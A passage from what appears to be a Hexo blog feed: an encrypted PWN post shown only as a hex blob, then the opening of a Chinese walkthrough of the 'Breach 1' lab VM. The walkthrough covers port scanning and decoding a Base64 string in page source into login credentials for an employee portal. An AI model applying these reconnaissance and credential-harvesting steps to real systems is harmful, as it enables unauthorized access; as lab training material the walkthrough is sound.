7ee39ac7ab4300daf84ce29f1c3a4c516f40cc1725d7ee434588374134f4b12d092b87ff63c0bf20697a6a9a1140f8771d2e34560cff14d29156c030efff6747c4a90e13a5637354b1a52fe0163da033568dd12556c5b8899abaee617ef95958fad52e4fd33f98b79d2c4a50ee7b06b5c6564a1b3edf01e5297a82c1898e2cfb57b38f74e0d6360e34910940258acc0421ca3ed0ab1791d53f356962c49453392ecaa3f39a12cd0a5f1855ac58443ea911b203a263821d55f9c30f7bfebc0c8b10eae9361e7de20f7236e737e6f242f881366d04123de6e88b57832a845495796fe940bd56c87c43ae0709178af9e995083685ddccb8aa75599095030f6324859821d0008ddd655fd054c19030d4074bb0141120021a1ae771e094cac159c6c81f7a1c17996263169e14d4d9a9e6672d22c845efc2f4a63d5f0880dbe5217d5977a8affdf01a90d861e81d33daa4c4cf11a81c45280deb306d969e15e5cf3af448f3d701269feb2b5dfdcdb1d8fece2261c05185cc4269da77ce9cd919b67364ec8376d13060e669989a6955be24f8a456467dee776c1772eacd96c7cba3a46b7feea6c9b5e358f0fc2c1eac53d3503853112f4c9bc76034192516c540b153e21b66de4c22435688fcbc3b2454806ccab4efa108c8a2bb6d6dbe364c69d4c438e1710da665a668f4b603819913b8040d8dbeb865aa47c4118f08a698ce4f87e2f251efd7e9d73e230ba792495e76fe8923b3a567fb8fda206500a2b95509c7224f256b1254d4ee172c1432d0bb4aacb38e6ef72d60655a24338c8f99fba2e28247895fbc715f20b59ca63d2af4614a658fed630d37a500895bc42c5d4968f2a8d97f77370570d3405cd1bb2f61a28e8c8319727af33c52239fc1b0bca6f4bcb3d355407ab91fcd8f5ce63f5e38bd04b828f0908787c9d3edc0bdd7f6bfde706b46dd04e01b82ecf6faa154ab976036094526a730508241dc7d69377f9b8f90f3cd8f6339604fdebcb0dfb9a20dd85f510a174725ac1680d4e43466fd16caaa61e439d78a21e224bcb98be2f6d9c868cfe8e921c13b453e002d30f8e38bf415ba59ff3ac435ce1f54e55bb0fcc88e9fcd0f6c34650b5dbd9233797ee8c6a4a412632965a00f69ead6327e491c73e0c6681cc36c2c7f7d27db453da5b2455b8a1f4475911832ad9a9634f5828fd1f98ce28b1afa63e6296c37d0a840344498c6e3987a8f040e1c1eee76ab226933a215e0a9db7ded7a7d52257c5353e964966390eee8f0579e2a07b090694ebab1de7cffda329330cdfcaee097ac9d47e543066be0e6df93d191d41a431b24b8243475dec8d9df9d1b4edb7ba720551eaedcb2d33f23e31941ac7b2ac3e1c641db12107f6e0be965a59c919a99ffd373eb1af1ed9e5a5fb8c128f29869fd1e9a1dac4cef05b63888faaea1f39e98697e94bb285d16f1d6c8b63ba782a623b509c55ab2bd6762e3c0922ae79fd2406110a2a6734252d2e3c4b717e5f531ed5b35a7ade129e59b78b3969303fcd6be60dda5ad53d99249272b89acf67bf710d2cabb0e51ba8c792cefbc9878b7d81408532bd2d5dbbadb3999cf23d7a2a06198d608a20ca44babb21b16a946f8c462d83abe3243775da2c59e2b5d7c099a3c28b9c7f27733079a27d8c5bc366cd21e320726600ee6d2644b5828c1e0335b9fc302c8c59e629c5dd3e336807e075602354dc73e62512d4235604c33e55802b2961c1f0184ef011d88d8b5265e80a92250445336d11273fa4f921d1a280c4d97d14c721ab541a62e1e77a267a0e68580ec0304046e9bf03430cb5371c136e74b9bbcb9da7059989190df636a364e064ff03fc60325dc05c6aac1cc96b52e0c8351f7280a543095863739f4b918bc33563a25f61fd6ceb635fca1be976e776ebdcb5a62c850e6e0c906fa886c15568d86ca504586bc946cb3e1a52b4d7ba09f0d559254a86275aa38e640d804b0ca3ed2cc5acedd706532cd0ca2a801063eef8ca50bfdddf4d8e0dea92b66370ed93db3d318de05b02ae7882a7df907e527915c726befe729d025b26bb2bb2ba19c595cb1d14ee4597e2e50830cb8034b69419b757fbe867cfeacb6b575b421573d2dafc752d9854475b51ebeec202f7dbb21622581ee708ee3c57367f5c1f060201d719790c241372a245f1d1b28764ac3935084e559ef48df637de28dc1d8f62686d4b4cbb906a915d7025cc91fc3ac51165349c63e9c3cd05e928e4c0fcf0881c8da7633a6c13bf75443b3b9a79c7956db398c5d5be8139c9ddd96acee53cc91f2bf148d0262a461389d60f081c997837a405228d4d62f3b08b732f6d6f18ed1f3fcdc400b249d6a9a5223898af72622acaffd8bd4f2bdb9b86c1b8f9dae82959b8eefc4e991391103f0c869ef3b790bfaf7e243ed117d90af96b5b67884756919cb0b919e42c1e26bf232e81c0d6e937b17b6e8db1fc8aacde2df91a3340a8c61e81f7507bc1c320ab0b22c02a3119961392286fed9cd7cb1dca9747e4e9164bc2a47c0893974cd6abe3da68abf0a4f6f23ebdacd1b4b0df23943294ec5fb8e3cc9878db391e39678051d6073644e4312c404df2a8f93fa4e48155424b392153e6861bb16509854b23bf5febbec359d8ee1ee7e7f7117ef0e9da3438ead18b3b8471ae67d8c1aec52a4a6185ebdedd436e65aa5a99034c9bd92729416c5d2a91abc42af2120a3f966b37f53e0eea7e7a930bde95c5f54b0afe1c0b3de797afdd26a0dd5d0e22538f71a01ed7fc03036e82b52c26668b1d9ebb6a920de742dd4ab04c838944e096925a219a1bff9dd5191b5566326c0e2e1301bb97bd11a05903d3a68ff1f64bd770f4f317fb8c66f3151bdd03a46fde57319f4719cc4e272e51e96e66865700a31d2656ec2bc5d5ab102a1e462c1d6404ede73c05756278c48254c0edc66b797838f94e1189feedd07c53a27de519a96f801b6fda87a57113b61ba6bd65c4bdd9ae63bc5fa913f0ba359d92b68281558368432641e4167ea77e206011d40843dbf96511ba124adb596d7b55a47fa485133dbe00e2772f3d7f29af953828a9a582aed3316ddcde5774c3794b6ebd1ebecdfadfaa0b3fd9d91a4582f2f22eb5ad8f72d7106bc23cb47fb44708920c5e2ad453227f2ad483a7ebd735673c36c93df2465c0db9bf1bedf820efc3ab6934e66a27c2188469db79ba00397c245e0c2349dbb58d4834c89f72c380975b1419ec5e3341fd16ccae19085675cc637c067baba468391f2b5a704fa3e8b7ca6c6c123b80ce39891da2e64661b63bf7a4a0b4f74ea89be20d48c489fc3b63b8337f11c3f05c850dfb107dedd02e51cf5361959cb93113e13d5f57190c74dfc7996912c217fa905e581b94e9dece6084a5ccf4dc426af9b2ead35b335f86334f9cffb34ed578fd995ae5c34a2420ce192bc3cf6dd88eca89423f24aaddfa21bd1765d3a39a04195831cead1afb0dca0279ad4ac6d22f60d5deff858353ecb651d248d1ca3ad7175360a2a97b7b5e9df7fd89a81306aa8dde38e51ed81605cbba087c96ffc540f58665a81e1a0f6aeb436c4d6c75a7573404dda8cf404862ede93964afc6902aadd347d5e65092064b48f20df9ecbe3ab04ed3ceee72f9be6cf05c5de36bad38a132bf6af2c2b458fb689065a06a3306bf6869c67f6f0d1d6d3a5d5dbfc2fa35a27d3c261045c32e6be690f6570cddc34a9192cf0abdb959d6c7df41aeca8880cdb3be5f3fa735edd6e6c734b2b38fcb9f4e0d58e0fcb77771e79d058c8a0b6cdf8eb76cec65c9a2ff1437ad832c75f6155c8744adff9aa4a19eb5ddf26b7796935561fe4d122f4cd9b083f67e4c60f5db49ee5878dc99242ffed9a64e6f6ddd7be30fc714b79915994e80996581d50bd868d598ab10fc75d189d9f846b74043e947891e279e9f9332dbdafc8e0219e225be7785d7317f0b84d5b381cb61432cd5713fff13c588fb72732c9ce8b39a5c35019a7c55a94df7a1c26bb0289fee864a98c1ae39509e711fd6401fbffd3d4f21603855930734309aa8330f7aeac345e1580eaabccaa6e3684e6d45d4cd8a90730e10100b7b6df33047e6f59539fb2d0760a5aca1d37464d906ce4fb338ad1ca59ca7a67a12c9406cffaf28a69ee0449bc07cd3387ce163355f08b3e9ba7bef1a38dca6b5fd27b3684329bfe074148d10c4255f8c856aba1456979741a0c0d83328bf0e7ab30a21e51bc7a4302f63f33aec6dcf182382cc42b7eb699bc4dba1bf1163a7e3817162f14b75c962fd2490bda9b02a602872c17c984b6de5d071cf67b036e666927e1274aa60c42d7129e8e0f4d2860b2d0e4dc4928a2b5dca94f2c292b975f9e70122a5d51b074d95ed8e6a95ee4c89ec70b9ef6d2ab6bcf6be92c4d67b6a0c0ede760ff93956adf9da1447f4e0081c4598821965a4fd73b24efddd557ad761c8193d0d180d039953e2ef6de582a9a8b7ed384f9a365aa0a2804ed340c4c55dd16e1b84eede25d891f465953eef5279cea360955dc69a1d7e227a632c236f553fd9ee3a951544b58aaed86e4174a18b4b3fe6b5527fbb582e381f1919127272227189d4a2cb829d482d1e1b7bc996960b525fc75b8818d2445c1fca78a8dca887a9935a0f083465e6042092fd71aff215e18e78f64462d38ec9937e98279d04600b9dd1764e394a7374bef3f0702e74ea8d4056628a72e6aa4f93cf36493be764df2130c6c85f13262cae10c7fdb5cd4e37a178d82bf22ec644c897e5710187ac81bb39e44d86c4428e48022fb72cef66f6567b0a0843513ef290fe039cb4c4be4a9a2996cfccfd63a05cca5d71f9aa0d9c9b971b758dcb63811b68672f457b4e69751a07a36c94e495946344b85a6709727e179a8cf9a43df1bdfc7750eaa55f09fbe452589a42a6f3840898ffee169a404451386f97bb28c159a85485fd52e352ed53462d4a060b48d1b30654bfe115ccacb333f07ee6b52e8642043774bb98f946e7e90eadc7b93692cb445865d0537a5ba09d6f4bc9860c3c73efd2f283fa085da014283f8b0b379bf7bf3a09ac4d886030030a81fd97234319a5ecdc24a50f263ea295047e2659a296b1323acfc6706ac86aaef7e8cbf01027d9ed4d8877b8565ab5e516048e627f07461926d066a96cf49f9c0a26abdcfcb2fc56efb3e56b7b06fbab9b1854c753916d6f188ad7c3d2b88839eeb992029c232878ce69dfd4f2ebe4dd5f450d571745623d2963db0b31dc001df537aee80cb6934b499c77b3d136415eaaffd9331740fd0b83b55880ed35005dd4275e8912cbbbf645a37c871882d4c46ea612690fd345a6b8613431f653d6dedc74869c306fedf3a1bf67974057fe607870a4fd6c9ee54fcb061f625f0571f63ebaa8f0c07d08cc25ba0cc80d7ad9f0eac6435054fbc67d24a727df37686c468b3e3ab02bed1df607c3151cacc53f9b7013d2dbeefd84b1018e5c59b4faa43a2f9a7ef2f83c3e594e0ef217bd6a650829bdf7fb31ddf93246e0d187e7d274d907f95f12feab16ccc242f8869b890b73494132f73ff7554ecb9869818b179a1ef87f172824862fe3f369f5b301928ed7b386e20b25e0889a30e2bf67eebad358705698f4d7360c85fbedbb9c99e5b22ec12e4e2c01f7b26b24a37b0efe1a4e401af37764e3b7335fc1d61a1eb8424bd06f7e0ae8d1185e63e2441b960c5a5c64d1fa0c875c0bd3db805942d1a10bcd3cf7b352fadd573c2b503a3375b68069d454f9d19139c3ee606ca01d106a87002e8a7ede03fb5d3ec1d970eccd0a6995fc7489003b8bfbac5d5cbe5880aa71f409aef6d38aa826ae04fbf32291ae13d48f34689534404ddf1494bd2d66b44b1f72c88508601fcb7ee494223edf80710da18c9e407dca72c4c987400d77dbd2bfab7c5f3a521771f307969f07a5acc3c0159c5d8061c84353727fcb24e33efdbac10408d3b4de3f2ffacf83da658c0695a9696f875324640c5bc37cb389d4228356c1831d950225de303400eda31c63054c95d752283db6e9cd9123c0b3e66007a379ef18676ed6de7820157ca56797674ad7b01da370a1ab0b6bc60006b6da492bb3bfafff91d8dba4785a3d1ce3179117795d11193f6be54d9e8eb4ac3cc9e158ee827ca55908eb76d070b3abeaa131b627971fdb37e23310b30936cf8fe9af97df08bc5c316c5608ed698436808e594d446bc13714b63be68f564f80a603c5ef19960c39465cbca3359f67cdf2fcf852e1f9e7faa06b99b88b7e067ca59ca8307bd89f887211a1202f6aaed28c47286ede4893a1fb47608ae09c0d9f399d99c2b73f54ccb8d9cc6a28bf256b4497459ee1920d841816eb8e3315fe80b46612a95f185c0abbec93158237b39bf4bd40d54919be3bf1835515f1520481f3f4be5685c019ef8c70dc5bef1840d1b7fa23902a6ca77c04d0b5322206b81986d08278c07fdaaa312ac494ee45ab01f777d02d38346f47b61a960e2e59ac76efa102e5b4cb15d640363d28126d76d9bc1c344e27c08df1d55c33edc149a3a8ce0f45b6cff232cb1d2848d81e47e5781420f4f021bf1966305825349fe3cc4a02ebf319c9ec72a709b00ffc5b99b86fd0e5e0c501f142ae16292f0e99ef45f1503080d81aa18fb910a88d455ad31487f580d90ffda0de1fe749c3992bb9af8fbf27de950c94aeed62a917c22f3fd54e5b2b6d776b7af11826ae8cc85add663ab0707794f4cb16ee039233fed11708f9243fb9282c91338f63a5272ec390af5dc4eeeaf71fd7f6f52a6bc73ce068c1e71a73fb1f130f717b0bb509b03a4941add5d8b1bdfd63e18e2697ff273d19c89098b1fbfc30824ca83a0404f383cae0b631fdad1b32e3705b2794724d89fc1635072ee621c4dd9e7e31a80a591b405ec449436112455327563850300d2d4af441a14d5c99f26463dd30c586189b410a4f878637ebd2c46dbad38ba35a9ab27282738de96a9f5250708218dd2357b3c85bbe844b972a9ed79a38ca33890213143032778499e93e68935a5dcae7ba6b12af56b1e7229a2332b3bea6fd55dfeaf311a258dab4f3772adbf84f62a971f7361ffc7e9ac21a5ff1f05783ee85bbcbf6b81508a31ff07f97bc943d2e4abcca6ae0f14767eb0a0d34a5b773006d79a1b79c5252cd2fefa959e6eb1dc33e106f52bc9fb7dbd8d015fc7cb73cd2432b485f62d5662232c37fd54073953c06ddf17449f09b9423b1c14e1b7fd6d210d31a46aee9633175b595d09a3be2f6d8a5c2bdaf3f5cb4039898248686be4fb274d0856f01483f4d4b2f7368507e37e8ab9efc5c3bed7b510ce153e892322159007482869349037efa10b9160aa535d0bd14802c43e594ce4436ee1b1e115f480dbdb0f92ffb17b81a38f66fa1031d471a2337a8f680295ea267002ab921fca73084a9f2bec738ce2b24d811e783d7f9edaaa4dc50da98a88e2dd9b40b9cccb884cba91f332f5d4529c97756a195a739feb4fe1db6e07ec2aeea2f1443a4b93849f11c71bf6806fe098c0f3c862df6584cdb20787cc58be3343e2236cbcd641ea2d77b12c60e8a6b068eed535d2047997dec9f1c851763a945f919e45688ade7aca60e7a38c755f20b7d8ce1d44274c06f3973223a9971ef775e32176dc593640bcd47c4063e6fd922bafe9a801b9c0c332420692bd74cd34cba065dd97e1bb39f724465e335a55d1f3f41648f77cc10cc1d634f4d9c208c7f9a1f7d33b11e84b3f81c5a760b2db297aa451dbb5de2c06d2f21148a2cb5e7cc9dc76814afe552a5c8c4ac9fa3d0ef97ba77a10762b056faf9d37016c9bf001b44f772aecb75cb8cb2181c4e4444cae1f2f6e024fc822801b67b53affb99f302c7c400e7f981681b7f61d57bab9bdb37b7fe75ec3b090788c5ed0baddcd0524b2b2c0f97e6dfb344e62010608aca7c87983e248dd000210cb321243037cf9c1063fef9e5ca9b72ca72b3d7b3ad51a71912d87cf429fcef9a2afb35afa26fb2aa108be1797bb5a63994447737d4b49efa98cb35e0a2287f1778facaadf10bf8e9114f3834054f6f5d56d330b6b370ac4bf60145de375ca0fe8421e5facb8018ac4cd4b145f861c6da1d55667937256b9dd1530e113c0b0dd8991b5f525a4385f95e4af9efdbc9ad8fe451fdf0deba1dca39dda4d5b6bf2834e8e8758280b24bec94bab7c6a49bb195d42d3d9fe9021cc4204f25693d709d910add50bf1ad3d3d8ac290992387383fabbda67fd4cc192b6ee0805a2c3f48c84f9fb6fd06c7c99c458f70e25a6f619bc7b2fe80ca5c12ff3001cc8abd663cdb772c42827f5d42e28d90bd56b36224d4f4a1651afcd0e17bce69f4ec2e22a2ae5f3f09b33c808da01bdf22945f395b052277ba0ce8f6a2c94318d4bf26d3b7987ffed9e1806f3c5092d90e5ec6a4b629f499fed918b725b89f387ffbe3b99af5fa2ef281714a478f9cae3e78c27f1a4684dce820bd34d7adf48535172db5a566f7b4e46ea063217a443b945bac37bfa0a81af35dad90e68d6d31aef1d7181b74844856ff0c08d1fc60da6720081efac3ae89528415ab64b2435127dd0761345600530d54d2d274e11d4aea4615ef54524fb10dcd3817330db850cba2d33c399bb5078587170969c1e6ec401e110f67791c9d8e92d6e6a66c5cf19f483767e12087a10c390e22199f188fc8daf7ddb3522947fe8aed1f9d01fe9e5ba453d4568c8dc012eb4fd35171e99a2086163cf783e3afec73432bbad7afaa5fa5b1e706748986b18c92f722dc35fab44773e8f77de796b85565364b47e0802597cc3e680bd60cc621505fb6c74fc0d8d978e4f11505340f29214cfc351cddb7a9c6f2e80270b7387c4cbc5c9ea55c95b6e70a1820ef3fafb2806cab97521b57df8089347de4536db40ce51ca7efbd323f907bcfd788ab7bd95d9db6d7dbf450d1730a569fb9755916549874fc11654cb41bb49b1a204cb335cc612fc3ccff541dea9b574cb691d7a0de65f4724af67699a427486b164eca12b6f657dafdde613a64372052e8adeb9d86053c478986b9300c7189382cd267319a56bd0e375876744a8822de8ab0763beca9f89ca1463b2486f05f0b8b362343c9ad39b734fa08621a194bcdee0c64d3e7f2c80821845a341a9311189b02f0b6a551ff35a2eb3bea7252cd25d1b68a8cc1b7db48ed1e7f3a2e6c02313c0840adfb5c2ee4d01b5cbb020f277d5fa6edddb3d38e51a497e79348c8271724f814ab33ec317fc2212ee0e24780a3f825f0c47188dd2ed7d7f04ae63e3c9dbd9cb68f182a27e3d30be0438c169c25f4ef9432022268af02592f22d0bdc8ff3c7444968bf93ac90a698e951f600d8633654ac646ebd10bcbb040970ca0f82801cffdf266e899a845f84126b7e508adb25dbd56ca2536bfff294d133304f9463e2615f9c609731bbb217d41250de696ce2a83edc10c79b32d66884c67f7b24b0437ae65f370cadc836231ad4326ad1d5da5b9a0ba56ed41eb06295369b81462bc8a2047d166c2c08366ae689e59d609c66c3948c0b0fa7a8a87e63825c3b5830ae2e44d5f47407dc91c7430a5d290e0a928ee84e4d700ecb72a94c3636e6937d2c489956c52ba80dd1b42b4e09a990bdbb587eca01dd00234f1dc8a2e0c0d63f7e2173cb368d2789855115ff33eb9ee6073def83a2af404cb69bc752a4fb2391845c02f76b456b372953ebcb4e6d1a12005cc7e9404a81328c271b7db9f0cd95b0e1b6861526f0fdabe7ae1eb93ce0822ae753cae210c30a1d815b7a1746c4a12da613c77049c4bac6c3269f852ae4155d4676fe356c5312760860de288c46cff79e22813d6abda28ba86e458803102c8e991827e272fa1c347c5351dc083396a5b193ba71cece78f9297f103eb36f4a430b098197853e4ed91426219e7813e9b3913a6b2eedbb762e76da2de400d1b54dd26a07e100d8dcd4163dffa73f7dbd716e070369d5e26ccdc128b22475347791a6e24c38f205f465ff7e39a6571cca684b9b0eaa5f7c7176819003212bdc76282c0173f6ad26d1e0cabce2091cba5531d1d7ac7b815c07c2335ea6e571cf9cc308d91d87a0503fb7526a0cbfc169d3b2d75b99b67d384f39d8630521e27335d245ec7b766c7db7f4dc315d2ac9e976a1e7dc6cc996d17ee4127e7dead9d8ff9cd0ea54854b49573b2e593e28b3c89c264460f34515acfc651374a7e4ff4ddb27e8a67af57fc1682b12286ee726010dbadaf6dc3031dd45fe0f4ea0a1474c452f0859106609ff395fbaf2317f257414264231940e57cbbf43a4bad2ca9cc6b0b3af7e47f646d21c0934e54e749650e1e07a96e8a166e9392a2ec36fdb5f5d182910ad53cf5ac1a1af46351179032d9d468ee3d4e270a471dd2fe1d5f727909b72c844f714e7efedbe46d68f699079eb2910cd4e443f8adb0b34afe748b26739d2ba63b87d97518bf8853161e5064875e0a873d10f6cb1862f8cdfad1f3ea02aabb0cd15208e5b254884efced3c3c0810078c5c9c6d5fd2288763ae3b8ad45887ab6c925a1fffcaf3176a3e28645bee4574722a17cbeb363fca50bc305df0afeb3c487944da321c743522d4e78541933f5186c5b3237ec97a628669e37e4a6ddcfbab42c7f480bce7d4b76d85ad916826be8e571aaba9af2b298fff069fd800336a8ba022f30f1e120eceea55916e5f156cf0969fc210f93ebae6b23f8d5d1705f371c45261d00070420052d2912d41e899790003347412b45657a03a70a05adb46b9fcf232ba0bbd90e14e80a77635ada5905ca0aaade0084c22687337659cfa8589f1bee088f53c19a2932f188a8ee47b646328afa50482769504dd37edec908134292e6c60af4e4f8c60087e1a89d1550c9e44348fb13acf76ca79e4b288fef0d290b1b392c6a867bb339e5659177f0dff919ec628e1382e2424d12da8a638105944edbf77ad9c5fec0c5c54e343e257c2a957d892c08d6e99054877b75a18840f19954c5fc42d1f3261a7723db065c6be29c150f624f3e4851d2b8bf55c21ff7643a0d8a236d1de5639834049f8e74bab4e4ef998393de8be6beefcd2c1201e8a942e6b4878657e47771fcc8114348fb6287cf3a2650a1443c54c4a4b999409d101fd3197408716471d7e861f902ef5c50c49b6370fe17fae86082472938dca2f81b6e081e57bd8d5561ba552129679e1cb987f9811fe5dbb612bedd4fb634197e89d007be033197ac39c7d8d5bfc108440f07305551617439d9aef23bc79942e9e715ec4bc545545c2ee9125e5e1ad5e40569c2d5466120f7636468c8fc9c96a2a47978bc86b76a671f892ec99551e81bacc6ecca7753a3fafe92b38ae3ad58e823958650c3c45c970c1b4b9be6e1bd59ba0beb9e480e8fd0125a625d5f3d6b18a2fd3f001a090fd6111bb47b55e1b40215f1994166d54da69f0ccefb8ba8c198d2b1da231f275609a83a4770b39bf110f658847a4a5c76ccd4260bfb1123846cd284d9dd744c1b6fbb790b540f9cd1ab0b065d8588028b87ca2cdc91669598c37fb54f4ea5fc558b98fbb113bacb278f0e4afe619996bf1f62981b2ce40aa2c3971f1dcdcb4f5cadd2199dea131b3b5b0652efd2f4045368e2bec38474e2706603a1b90b03dd00745f18629d54f13aed2c8f55f1a081c376b5df439e1b03e77e50c5b830803e0156520497830434554ac1b6a9d9834a051abc00624b6bdb186de65cdd194d5b406be694dc44437bd2b1fcb6273179fdacf96f52f02e66c853199d594480e10a891b93a94e170ff578bf52b4d353b7c1efe247e27217ac15e84decdb6a55f04a7d6e5401da9b01ed17746d714a96d070b90c7ceee5f1a796fb4de917c60585cb763d4991457392693efbff4cd0acd448a2b222fb0bf741bd76d0fb131fb9477d1ea7ee76cb3e622b96b20a647cf11c1dcbfab3cb063e4dcab0bf2fe4629c64543614d79bd9af2219d609c5b773dd870f4c6893c0457ce2084ff6185e31589e81fad73c00476b2ac2b1e15a947f819dfcd113e2f954eed1b018316f06020810d00fdaacd410d18fba4cb5a447c0be029b1576c1a43519b940e7fd8afe641f7d29aae4d195fc1cd38f4fb6878e61a57836127a449f37cd623d6e3ef1f908d0cebefbb61150bf84144b1502224902963b401c318487607350e222fbe5c04ecd923aa92d3f0bd3c6cf7bed8ed4da83f843546b53015edb4957ac012c58c20d030d35d64559a5cfdcc70c54a62df1c4e29d574b6afd99a0973e6eefc0b105383feee97c4c3e721f31bb4a9efb2fad88f79d0de97508fb8ac7fc35deb265394721ec5c1349c28c7708c2c053e36c0e5df740cc3f70ce67f980da1774e383d3ece20929b5a4835157c6cea51c9a22388f739d3bdca3d7990ceb33f49302cb2fa5abcf7a6e7bb2aa010e1e9b97af93659d05991b01eb10d878f1454d90f580076b4ab103ce726046722a1244b4cebd8c9c13f1c3e476e6d553af7fb72920d0703fdb272869f7fff6e26f9715e4d63e11961bb56889e4628aea4a5368cc1d3eb716516c975ee8efcb3f242c0d2fbb4db0d7d87680a81a82dbb9cee2df83daaa2220b522e2dbf494519b094d229ef8a548a4beaef9e86d648315ae4ca7feb951bc8517fc13bb8552b4f05c8c82b63a3913faaf1d5fab78f883452fe3b8a6f97b56fb2adc4685af46a5c424b2f22cf32d48324a13dd553759c16196000ded0ae68b4db1538615f5b98091056988d204ce7d845f97d89f437220e3e5f125b6aabd5ebbc4128c5c306bce8c338457ef43ec43590f5d2c7c0aa00c8aec226cc058fe976a28a9160ec3e0a767b71d5e8ae2b62f7cd89dd5408baa04781cdcc8b497b48efc906bdba979627cc5d7d23dea376f3f9138f39dc2012368a0960eba3b90d55b9e7e3725ea03132d0aab18cb41f260cca80c96bff182060a1ecc237764b8b9788e3fcb5717d9fac9c0f3467e2eb24ffd492e3659606f07a6ea198b7b0e13666c12a6f0007749c796b9a25b90966b564675a5bbb4ea11385f44bde92733cc800beb27fc27902a9457bdb014a827299df193ecffbbc4c9e7f377b725374a871426ff7bfbed5d2eddf03643f5ef309c5bfa7c4a8cba5a9b55ff6b037fb841d6dea9fa868f2cfa92cee9c0b54c354da918fe02cf315a104b94afe4ec153fe7704a67650b51891ee12f657dbe97133de3afd66b080ee97143622c42f6b33b6e81a43a5155b1d815ee4ff724b97645c3c38efb603fd55ecbfa8c78d6d9b452b3c8c5dceb3258cf8d0fea27f87e9a5af6c5a1c3b61d31f4ebb4cb05e00bfd5534a3727739980ca30c72ea78b4dc81c525ebd6cbeba067d373c5c50112d12141b9a2023ebd1996a844e1b0362370be34b6e1104788bc08ab65e0c626a1af7726458e24021c4893956dd409249975cf56bcb9efa293bdcd6f2359a329644f99db742b945e5c1fc300e68e14d3e0354e46d017546fc69149745123170adf2641073db231ad6f947d91f87e83671fd9cfaa099db480d48945f9d1c213c677f277428fdb3e86f150e41687bd434d13af6f445327b96fc1a035afb18a2267527745c9c7af36a08b70c9f39b9e3032e0135a2bf40d50795020795c14c5005509c7af111e0ccc9bd41caddf43468c971222b7869412e0925fe85b89901875e26b10e1a59da955f0494c44f971111f34681ab5117e31e930c857762c2bd5a5f45f8fc6eeb5300a5da9e8c2d4e796d4bc0a65e5fbe8848fb2b2674f14dde51289522e24c0206f1bc25a862f07ace2bca377ab878b1cc67e926d59e4fbab908a238e4ce0f23e5229d45729f938332d5911d14c24114e6be2fe41c19b82a81cb51e39aa82baa9357c27b412a204dcc6060e9f6dc2246d2f0d8ccc2c0e9ed52a4557b81de69cde9e95645b4be0712f85a9a3b96fc142faee64c7f520f80470b2f36eecd132706df640ec0ae65f8e6fa40b3d3671f4fbd4acfb37c0190dee29602401d55ba5616de55429e5b2a9fffbb78507c9e6316878d68839b5c7681dbdf34ae288b47d8e47b2a348bf1b58ab91ea88d41741ad3d648210da966e8dd824cf9a44463fc8e99b4675a083f08a23314f0c6e29d22dbc46b37312e36e6176825e668e9e5269e320236da6e68157d6333997b79eb866e24b6f4692e4cd29643654ea2b50a59c72e594c87308381f9d3e4a0a6ed02f3cc6179b32fd13ac16b831e5e14a135783bdb25e77441c435f10b7da67c87c133878ee4f6845e10e9faf4b55f27fcd10a047d9a012e5f5738675048a742da3a4deac52052051a5deff33962b60fe6c000f653f8f0e735cf776570db8e21c6acb1c99ee7a4fc18c539f8a58ffcfcdbbdad7e6cc5d4b0b817c893e64f39644da50744ef76eb61450bf793c73d588af206ed40007399beb793b991981cbbc6ede96435e65025df3fa60cb50b63930b2d96ff5b6e89c361a8f90120982a0c6f2a7de33958c82f01ad6f7b74ba460820a386c5561e9036b6dd7193b5f639bbef1c663c8c44c6a622f5d4818702b88b442ce8d0f6fc50af781683208240cfd52760f0b2cf8b51a9d132e1a7d19ec08b12e61842244a51ba2b981d4423e97435f6b3c169a5df51e331d4f1c761d0b5a1afd52d63d9d4b54a461442a220c4154da220892af60d68d35012497481ed0cb51aa387f60f083fab056e19a120016c4c4d04652f51980e640aa364d508c5818173237712eb798185ee1a1eb5bcd5d09755c03ab170a9056fc6bc129607d748fdd3fc4614e70a5f882045f3bf9ce731203e39eede3861f3c9a18e3e2062a4ba901153c777bdf52037d8c38125e53390ffb1948e3a4e2af1d2b8c6d0982f6f19f1088351a979a525b2f402f2972f7c6fba2d04f5530aeae345e0123916f6f9ce11a7904b1047463da1c224f9fa2400545f262e2700c33601ba1a5e9777fea3d27b0bf7909a0e31a93c2719c73619fff3c68b6187c9ba1f359c22bfcfb59a091cfbc91670db27be53d08619dc0e0325c3b0e4b5f917179e810685a0abe327b64327c12cea6d27d9233db26b59cb1c3613f706ecbfac150a3ca38f35bf003de6b1ec5c5c609d4d85580119a35ed97b9459a88444718769f739e5591646355a29e093462ce515b432ce2fad92af801b99a1b98e159711cf8c60ac55b211719efb48a39270c9384744ac4feb153a9430aa4c01f8bde170700a1d07987d65a080761951b0d7ec41c1cddd524cfa23a0dce7ef65121f7257eb72b2eb629ac5d9c74c1e1dee59b4f24fd0b39395a7bec13db133b675d2e6ac8a9c270b1e30e8ff1ed0e3dc0ff7554b82234193a89d93c078b0e7af74a3a1281189a628437dd18</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">禁用</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Breach 1</title>
    <url>/2020/06/04/%E9%9D%B6%E5%9C%BA-Breach-1/</url>
    <content><![CDATA[<h1 id="Breach-1"><a href="#Breach-1" class="headerlink" title="Breach 1"></a>Breach 1</h1><p>攻击机:192.168.110.3</p>
<p>靶机:192.168.110.140</p>
<p>*注:该靶场需要配置静态IP:192.168.110.140</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Breach-1/1.jpg" alt="1"></p>
<p>端口扫描就遇到了问题，基本上全端口开放，显然是某种安全措施</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看80端口web服务，发现存在页面</p>
<p>查看网页源代码</p>
<p><img src="/images/Breach-1/2.jpg" alt="2"></p>
<p>存在一段Base64加密的字符串，对它进行解密</p>
<p><img src="/images/Breach-1/3.jpg" alt="3"></p>
<p>得到<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
<p>之后发现页面图片存在链接，点击跳转</p>
<p><img src="/images/Breach-1/5.jpg" alt="5"></p>
<p>之后点击<code>Employee portal</code>,跳转<code>impresscms/user.php</code></p>
